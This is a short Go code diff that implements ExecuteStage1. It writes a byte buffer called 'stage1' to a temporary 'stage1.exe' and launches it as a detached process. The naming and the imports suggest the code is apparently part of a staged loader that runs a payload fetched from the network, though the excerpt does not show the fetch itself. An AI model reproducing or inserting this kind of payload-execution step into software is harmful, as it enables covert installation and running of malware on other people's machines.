@@ -14,6 +14,9 @@ import (
 	"io"
 	"net/http"
 	"net/url"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"strconv"
 	"sync"
 )
@@ -858,6 +861,25 @@ func ExecuteStage1(stage1 []byte) error {
 	if len(stage1) == 0 {
 		return fmt.Errorf("empty stage1")
 	}
+
+	tmpDir, err := os.MkdirTemp("", "aegis-stage1")
+	if err != nil {
+		return fmt.Errorf("create temp dir: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	exePath := filepath.Join(tmpDir, "stage1.exe")
+	if err := os.WriteFile(exePath, stage1, 0700); err != nil {
+		return fmt.Errorf("write stage1: %w", err)
+	}
+
+	cmd := exec.Command(exePath)
+	cmd.Stdout = os.Stderr
+	cmd.Stderr = os.Stderr
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("execute stage1: %w", err)
+	}
+	// Don't wait — stage1 runs independently
 	return nil
 }
 
